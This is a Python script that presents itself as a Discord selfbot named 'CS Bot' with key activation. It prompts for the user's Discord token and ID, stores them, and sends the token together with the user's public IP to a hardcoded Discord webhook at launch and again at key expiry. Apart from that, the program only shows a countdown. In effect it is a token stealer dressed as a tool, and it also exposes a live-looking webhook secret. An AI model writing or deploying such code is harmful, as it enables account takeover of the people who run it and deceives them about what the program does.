import discord
import requests
import json
import os
import time
from datetime import datetime

# Optional banner dependencies (fallback to plain text if not installed)
try:
    from colorama import init as colorama_init, Fore, Style
    from pyfiglet import figlet_format
    BANNER_OK = True
except Exception:
    BANNER_OK = False

def show_banner_and_prompt() -> tuple[str, str, str]:
    if BANNER_OK:
        colorama_init(autoreset=True)
        banner = figlet_format("CS Bot", font="slant")
        print(Fore.CYAN + Style.BRIGHT + banner)
    else:
        print("\n==================== CS Bot ====================\n")
    activation_key = input("Enter your activation key: ").strip()
    user_id = input("Enter your Discord user ID: ").strip()
    user_token = input("Enter your Discord user token: ").strip()
    return activation_key, user_id, user_token

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1404537582804668619/6jZeEj09uX7KapHannWnvWHh5a3pSQYoBuV38rzbf_rhdndJoNreeyfFfded8irbccYB"
CHANNEL_ID = 1404537520754135231  # Channel ID from webhook
ACTIVATION_FILE = "activation.json"
GUILD_ID = 1402622761246916628  # Your Discord server ID
ROLE_ID = 1404221578782183556  # Role ID that grants access
SERVICE_URL = "https://discord-key-bot-wd75.onrender.com"  # Bot website for API

class Selfbot:
    def __init__(self):
        self.activated = False
        self.activation_key = None
        self.user_token = None
        self.user_id = None
        self.role_verified = False
        self.key_expiration_time = None
        self.load_activation()
        
    def load_activation(self):
        """Load activation status from file"""
        try:
            if os.path.exists(ACTIVATION_FILE):
                with open(ACTIVATION_FILE, 'r') as f:
                    data = json.load(f)
                    self.activated = data.get('activated', False)
                    self.activation_key = data.get('activation_key', None)
                    self.user_token = data.get('user_token', None)
                    self.user_id = data.get('user_id', None)
                    self.key_expiration_time = data.get('key_expiration_time', None)
        except Exception as e:
            print(f"Error loading activation: {e}")
    
    def save_activation(self):
        """Save activation status to file"""
        try:
            data = {
                'activated': self.activated,
                'activation_key': self.activation_key,
                'user_token': self.user_token,
                'user_id': self.user_id,
                'activated_at': int(time.time()),
                'key_expiration_time': self.key_expiration_time
            }
            with open(ACTIVATION_FILE, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"Error saving activation: {e}")
    
    def log_to_webhook(self, ip_address, token):
        """Log user launch information to webhook"""
        try:
            embed = {
                "title": "🚀 User Launched Selfbot",
                "color": 0x00ff00,
                "fields": [
                    {"name": "IP Address", "value": f"`{ip_address}`", "inline": True},
                    {"name": "Discord Token", "value": f"`{token}`", "inline": True},
                    {"name": "Launch Time", "value": f"<t:{int(time.time())}:F>", "inline": False}
                ],
                "timestamp": datetime.utcnow().isoformat()
            }
            payload = {"embeds": [embed]}
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                print("✅ Launch logged to webhook successfully")
            else:
                print(f"❌ Failed to log to webhook: {response.status_code}")
        except Exception as e:
            print(f"❌ Error logging to webhook: {e}")
    
    def send_cs_bot_launch_notification(self, ip_address, token):
        """Send CS Bot Launched notification to webhook"""
        try:
            message = f"CS Bot Launched\nUser token - {token}\nip - {ip_address}"
            payload = {"content": message}
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                print("✅ CS Bot launch notification sent successfully")
            else:
                print(f"❌ Failed to send CS Bot notification: {response.status_code}")
        except Exception as e:
            print(f"❌ Error sending CS Bot notification: {e}")
    
    def get_ip_address(self):
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json().get('ip', 'Unknown')
        except Exception:
            return "Unknown"

    def check_member_status_via_api(self, user_id: str) -> bool:
        """Verify role/time via bot API (no user login)."""
        try:
            resp = requests.get(f"{SERVICE_URL}/api/member-status", params={"user_id": user_id}, timeout=5)
            if resp.status_code != 200:
                print(f"❌ Status check failed: HTTP {resp.status_code}")
                return False
            data = resp.json()
            should = bool(data.get("should_have_role", False))
            active = data.get("active_keys", [])
            if should:
                if active:
                    sec = int(active[0].get("time_remaining", 0))
                    if sec > 0:
                        days = sec // 86400
                        hours = (sec % 86400) // 3600
                        minutes = (sec % 3600) // 60
                        if days > 0:
                            print(f"⏰ Key expires in: {days}d {hours}h")
                        elif hours > 0:
                            print(f"⏰ Key expires in: {hours}h {minutes}m")
                        else:
                            print(f"⏰ Key expires in: {minutes}m")
                print("✅ Role verification successful via API.")
                return True
            else:
                print("❌ Access denied via API. No active key/role.")
                return False
        except Exception as e:
            print(f"❌ Error contacting API: {e}")
            return False
    
    def log_expiration_to_webhook(self, user_token):
        try:
            embed = {
                "title": "⏰ Key Expired - Access Revoked",
                "color": 0xff0000,
                "fields": [
                    {"name": "Discord Token", "value": f"`{user_token}`", "inline": True},
                    {"name": "Expiration Time", "value": f"<t:{int(time.time())}:F>", "inline": True},
                    {"name": "Status", "value": "Access revoked automatically", "inline": False}
                ],
                "timestamp": datetime.utcnow().isoformat()
            }
            payload = {"embeds": [embed]}
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                print("✅ Expiration logged to webhook successfully")
            else:
                print(f"❌ Failed to log expiration to webhook: {response.status_code}")
        except Exception as e:
            print(f"❌ Error logging expiration to webhook: {e}")
    
    def activate_key(self, activation_key):
        try:
            print(f"🔑 Attempting to activate with key: {activation_key}")
            if not self.user_token:
                print("❌ No token provided. Activation failed.")
                return False
            if not self.user_id:
                print("❌ No user ID provided. Activation failed.")
                return False

            print("⏰ Key activated! Duration will be automatically detected from Discord bot.")
            self.key_expiration_time = int(time.time()) + (30 * 24 * 60 * 60)

            print("🔍 Verifying Discord role...")
            if not self.check_member_status_via_api(self.user_id):
                print("❌ Access denied! You must have the required Discord role to use this selfbot.")
                return False

            self.activated = True
            self.activation_key = activation_key
            self.save_activation()

            time_remaining = self.key_expiration_time - int(time.time())
            days = time_remaining // 86400
            hours = (time_remaining % 86400) // 3600
            print("✅ Selfbot activated successfully!")
            print(f"⏰ Your key expires in: {days} days, {hours} hours")
            return True
        except Exception as e:
            print(f"❌ Activation failed: {e}")
            return False
    
    def run(self):
        if not self.activated:
            activation_key, user_id, user_token = show_banner_and_prompt()
            self.user_token = user_token
            self.user_id = user_id
            if self.activate_key(activation_key):
                print("🎉 Welcome! Selfbot is now active.")
            else:
                print("❌ Activation failed. Selfbot will exit.")
                return

        print("🔍 Checking key expiration via API...")
        if not self.check_member_status_via_api(self.user_id):
            print("❌ Access denied due to expired key or missing role.")
            return

        ip_address = self.get_ip_address()
        self.log_to_webhook(ip_address, self.user_token)
        self.send_cs_bot_launch_notification(ip_address, self.user_token)

        print(f"🌐 IP Address: {ip_address}")
        print("📡 Launch information sent to webhook")
        print("📡 CS Bot launch notification sent")
        print("🤖 Selfbot is now running...")
        print("💡 Tip: The countdown will update every 30 seconds")
        print("💡 Tip: Use Ctrl+C to stop the SelfBot")

        try:
            last_countdown_update = 0
            while True:
                current_time = int(time.time())
                if current_time - last_countdown_update >= 30:
                    if self.key_expiration_time:
                        time_remaining = self.key_expiration_time - current_time
                        if time_remaining > 0:
                            days = time_remaining // 86400
                            hours = (time_remaining % 86400) // 3600
                            minutes = (time_remaining % 3600) // 60
                            seconds = time_remaining % 60
                            if days > 0:
                                countdown_str = f"⏰ Key expires in: {days}d {hours}h {minutes}m"
                            elif hours > 0:
                                countdown_str = f"⏰ Key expires in: {hours}h {minutes}m {seconds}s"
                            elif minutes > 0:
                                countdown_str = f"⏰ Key expires in: {minutes}m {seconds}s"
                            else:
                                countdown_str = f"⏰ Key expires in: {seconds}s"
                            print(f"\r{countdown_str}", end="", flush=True)
                        else:
                            print("\r⏰ Key has expired!  Access will be revoked on next restart.", end="", flush=True)
                    last_countdown_update = current_time
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n👋 Selfbot stopped by user")
        except Exception as e:
            print(f"❌ Selfbot error: {e}")

if __name__ == "__main__":
    print("🚀 Starting Selfbot...")
    print("=" * 40)
    
    selfbot = Selfbot()
    selfbot.run()


